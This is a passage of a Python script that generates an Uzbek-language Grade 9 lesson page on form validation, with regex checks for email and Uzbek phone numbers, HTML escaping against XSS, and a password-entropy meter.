        <input id="userName" type="text" class="input-field" placeholder="Masalan: Sardor Aliyev" data-placeholder-ru="Например: Сардор Алиев" data-placeholder-en="E.g.: Sardor Aliyev" oninput="validateName()" />
        <div id="nameFeedback" class="feedback-text" style="color:#64748b;" data-ru="Введите имя..." data-en="Enter full name...">Ismingizni kiriting...</div>
      </div>

      <!-- 2. EMAIL INPUT -->
      <div class="input-group">
        <label class="input-label" data-ru="Email Адрес (Regex проверка):" data-en="Email Address (Regex validation):">Email Manzili (Regex Tekshiruvi):</label>
        <input id="userEmail" type="text" class="input-field" placeholder="user@target.uz" data-placeholder-ru="user@target.uz" data-placeholder-en="user@target.uz" oninput="validateEmailLive()" />
        <div id="emailFeedback" class="feedback-text" style="color:#64748b;" data-ru="Ожидание ввода..." data-en="Awaiting input...">Kutilmoqda...</div>
      </div>

      <!-- 3. UZBEKISTAN PHONE -->
      <div class="input-group">
        <label class="input-label" data-ru="Телефон (+998 операторы Узбекистана):" data-en="Phone (+998 Uzbek mobile operators):">Telefon Raqami (+998 O'zbekiston Operatorlari):</label>
        <input id="userPhone" type="text" class="input-field" placeholder="+998901234567" data-placeholder-ru="+998901234567" data-placeholder-en="+998901234567" oninput="validatePhoneLive()" />
        <div id="phoneFeedback" class="feedback-text" style="color:#64748b;" data-ru="Формат: +998901234567" data-en="Format: +998901234567">Format: +998901234567</div>
      </div>

      <!-- 4. PASSWORD & ENTROPY -->
      <div class="input-group">
        <label class="input-label" data-ru="Пароль (Шенноновская энтропия):" data-en="Password (Shannon entropy meter):">Parol (Shennon Entropiyasi):</label>
        <input id="userPass" type="text" class="input-field" placeholder="Kiber#Parol2026" data-placeholder-ru="Kiber#Parol2026" data-placeholder-en="Kiber#Parol2026" oninput="validatePasswordLive()" />
        <div class="entropy-bar-track">
          <div id="entropyBar" class="entropy-bar-fill"></div>
        </div>
        <div id="passFeedback" class="feedback-text" style="color:#64748b;" data-ru="Энтропия: 0 бит" data-en="Entropy: 0 bits">Entropiya: 0 bit</div>
      </div>

      <button class="btn" style="background:var(--accent-green); margin-top:8px;" onclick="submitFormSecure()" data-ru="🚀 Отправить без Перезагрузки" data-en="🚀 Submit Securely">🚀 Xavfsiz Yuborish (0 ms)</button>
    </div>
  </div>

  <!-- RIGHT: REAL-TIME AUDIT LOG -->
  <div class="panel">
    <div class="panel-header">
      <span data-ru="ТЕРМИНАЛ КИБЕР-АУДИТА И САНИТИЗАЦИИ" data-en="CYBER AUDIT & SANITIZATION TERMINAL">KIBER-AUDIT VA TOZALASH TERMINALI</span>
      <span style="color:var(--accent-blue); font-size:10px;">Security Hook Active</span>
    </div>
    <div id="auditConsole" class="console-body">
      <div style="color:#64748b;" data-ru="[Готов к анализу] Печатайте в полях слева для отслеживания Regex совпадений и очистки XSS в реальном времени." data-en="[Audit Ready] Type in the fields to track live regex assertions and XSS escaping in real time.">[Audit tayyor] Chapdagi maydonlarga matn kiriting va Regex mosligi hamda XSS tozalanishini kuzating.</div>
    </div>
  </div>
</div>

<script>
function logAudit(msg) {
  var c = document.getElementById('auditConsole');
  var d = document.createElement('div');
  d.style.marginBottom = '6px';
  d.innerHTML = msg;
  c.appendChild(d);
  c.scrollTop = c.scrollHeight;
}

function sanitize(str) {
  var map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
  return str.replace(/[&<>"'/]/g, function(s) { return map[s]; });
}

function validateName() {
  var el = document.getElementById('userName');
  var fb = document.getElementById('nameFeedback');
  var val = el.value;

  if (/[<>"'/]/.test(val)) {
    el.className = 'input-field invalid';
    fb.textContent = '⚠️ Xavfli XSS belgilari aniqlandi! Zararsizlantirildi.';
    fb.style.color = 'var(--accent-red)';
    logAudit('<span style="color:var(--accent-red);">[XSS Alert]: Yovuz kiritma zararsizlantirildi: </span><code>' + sanitize(val) + '</code>');
  } else if (val.length >= 3) {
    el.className = 'input-field valid';
    fb.textContent = '✅ Ism to‘g‘ri formatda.';
    fb.style.color = 'var(--accent-green)';
  } else {
    el.className = 'input-field';
    fb.textContent = 'Kamida 3 ta belgi kiriting...';
    fb.style.color = '#64748b';
  }
}

function validateEmailLive() {
  var el = document.getElementById('userEmail');
  var fb = document.getElementById('emailFeedback');
  var val = el.value;
  var regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;

  if (!val) {
    el.className = 'input-field';
    fb.textContent = 'Kutilmoqda...';
    fb.style.color = '#64748b';
  } else if (regex.test(val)) {
    el.className = 'input-field valid';
    fb.textContent = '✅ Email qat‘iy Regex testidan o‘tdi!';
    fb.style.color = 'var(--accent-green)';
    logAudit('<span style="color:var(--accent-green);">[Email Valid]: </span>' + sanitize(val));
  } else {
    el.className = 'input-field invalid';
    fb.textContent = '❌ Noto‘g‘ri email (@ va domen kerak)';
    fb.style.color = 'var(--accent-red)';
  }
}

function validatePhoneLive() {
  var el = document.getElementById('userPhone');
  var fb = document.getElementById('phoneFeedback');
  var val = el.value;
  var regex = /^\\+998(9[0-9]|33|88)\\d{7}$/;

  if (!val) {
    el.className = 'input-field';
    fb.textContent = 'Format: +998901234567';
    fb.style.color = '#64748b';
  } else if (regex.test(val)) {
    el.className = 'input-field valid';
    fb.textContent = '✅ O‘zbekiston operatori tasdiqlandi!';
    fb.style.color = 'var(--accent-green)';
    logAudit('<span style="color:var(--accent-green);">[Phone Valid]: </span>' + sanitize(val));
  } else {
    el.className = 'input-field invalid';
    fb.textContent = '❌ Noto‘g‘ri telefon (Masalan: +998901234567)';
    fb.style.color = 'var(--accent-red)';
  }
}

function validatePasswordLive() {
  var el = document.getElementById('userPass');
  var val = el.value;
  var bar = document.getElementById('entropyBar');
  var fb = document.getElementById('passFeedback');

  var pool = 0;
  if (/[a-z]/.test(val)) pool += 26;
  if (/[A-Z]/.test(val)) pool += 26;
  if (/\\d/.test(val)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(val)) pool += 32;

  var entropy = 0;
  if (pool > 0 && val.length > 0) {
    entropy = Math.round(val.length * (Math.log(pool) / Math.log(2)));
  }

  var pct = Math.min(100, Math.round((entropy / 80) * 100));
  bar.style.width = pct + '%';

  if (entropy === 0) {
    bar.style.background = 'var(--accent-red)';
    fb.textContent = 'Entropiya: 0 bit (Bo‘sh)';
    fb.style.color = '#64748b';
    el.className = 'input-field';
  } else if (entropy < 40) {
    bar.style.background = 'var(--accent-red)';
    fb.textContent = 'Entropiya: ' + entropy + ' bit (Juda zaif! Brute-force: 2 soniya)';
    fb.style.color = 'var(--accent-red)';
    el.className = 'input-field invalid';
  } else if (entropy < 60) {
    bar.style.background = '#eab308';
    fb.textContent = 'Entropiya: ' + entropy + ' bit (O‘rtacha parol)';
    fb.style.color = '#eab308';
    el.className = 'input-field';
  } else {
    bar.style.background = 'var(--accent-green)';
    fb.textContent = 'Entropiya: ' + entropy + ' bit (Kiber-Mustahkam ✅)';
    fb.style.color = 'var(--accent-green)';
    el.className = 'input-field valid';
    logAudit('<span style="color:var(--accent-purple);">[Password Strong]: </span>Entropiya ' + entropy + ' bit.');
  }
}

function submitFormSecure() {
  logAudit('<span style="color:#38bdf8; font-weight:700;">[Submit]: Forma muvaffaqiyatli qabul qilindi. Sahifa qayta yuklanmadi (0 ms).</span>');
  alert('Xavfsiz forma qabul qilindi! Barcha maydonlar 100% toza.');
}

function resetForm() {
  document.getElementById('userName').value = '';
  document.getElementById('userEmail').value = '';
  document.getElementById('userPhone').value = '';
  document.getElementById('userPass').value = '';
  var inputs = document.querySelectorAll('.input-field');
  inputs.forEach(function(i) { i.className = 'input-field'; });
  document.getElementById('entropyBar').style.width = '0%';
  document.getElementById('nameFeedback').textContent = 'Ismingizni kiriting...';
  document.getElementById('emailFeedback').textContent = 'Kutilmoqda...';
  document.getElementById('phoneFeedback').textContent = 'Format: +998901234567';
  document.getElementById('passFeedback').textContent = 'Entropiya: 0 bit';
  document.getElementById('auditConsole').innerHTML = '<div style="color:#64748b;">[Forma tozalandi] Qaytadan sinab ko‘ring.</div>';
}
</script>

</body>
</html>
"""
    out_path = os.path.join(DEST_DIR, "studio", "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    print("  ✓ Created: studio/index.html")

def main():
    print("📦 Building 9-sinf (Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation)...")
    build_presentation()
    build_worksheet()
    build_homework()
    build_teacher_reading()
    build_studio()
    print("🎉 Done! Generated Grade 9 Lesson 34.")

if __name__ == "__main__":
    main()
